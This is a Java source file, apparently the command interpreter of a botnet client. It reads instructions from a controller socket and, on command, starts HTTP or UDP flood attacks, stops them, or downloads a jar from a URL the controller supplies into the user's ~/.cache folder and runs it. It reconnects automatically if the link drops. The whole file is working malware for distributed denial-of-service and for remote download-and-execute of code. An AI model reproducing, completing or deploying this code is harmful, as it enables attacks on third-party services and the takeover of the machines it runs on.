package net.vitox.client;

import net.vitox.client.commands.HTTPAttack;
import net.vitox.client.commands.UDPAttack;
import net.vitox.client.util.SendUtil;

import java.io.IOException;
import java.net.Socket;
import java.util.Set;

public class InterpreteCMD implements Runnable {

    public Socket socket;
    public static String getCommand;
    public Client client = new Client();
    public int currentPacket = 0;

    public InterpreteCMD(Socket socket) {
        this.socket = socket;
    }

    @Override
    public void run() {

        new Thread(() -> {
            try {
                while (true) {

                    getCommand = SendUtil.getInstance().readMsg(socket);

                    String[] command = getCommand.split(Client.TRIM_CHAR);

                    switch (command[0]) {

                        case "HTTP_ATTACK":
                            new Thread(() -> HTTPAttack.startAttack(command)).start();
                            System.gc();
                            break;

                        case "UDP_ATTACK":
                            new Thread(() -> UDPAttack.startAttack(command)).start();
                            System.gc();
                            break;

                        case "ATTACK_STOP":
                            new Thread(() -> {
                                Set<Thread> threads = Thread.getAllStackTraces().keySet();
                                for (Thread t : threads) {
                                    if (t.getName().equals("attack")) {
                                        t.stop();
                                    }
                                }
                            }).start();
                            break;

                        case "DOWNLOAD_AND_EXECUTE":
                            new Thread(() -> {
                                try {
                                    String[] fileName = command[1].split("/");
                                    Client.downloadJar(command[1], System.getProperty("user.home") + "/.cache/" + fileName[fileName.length - 1]);
                                    Runtime.getRuntime().exec("java -jar " + System.getProperty("user.home") + "/.cache/" + fileName[fileName.length - 1]);
                                } catch (Exception e) {

                                }
                            }).start();
                            break;

                        case "STOP":
                            System.exit(1);
                            break;
                    }
                    currentPacket++;
                }
            } catch (IOException e) {
                Client.tryToConnect[0] = true;
                try {
                    Client.unique.freeLock();
                } catch (Exception exception) {
                }
                client.connect();
            }
        }).start();

    }

}
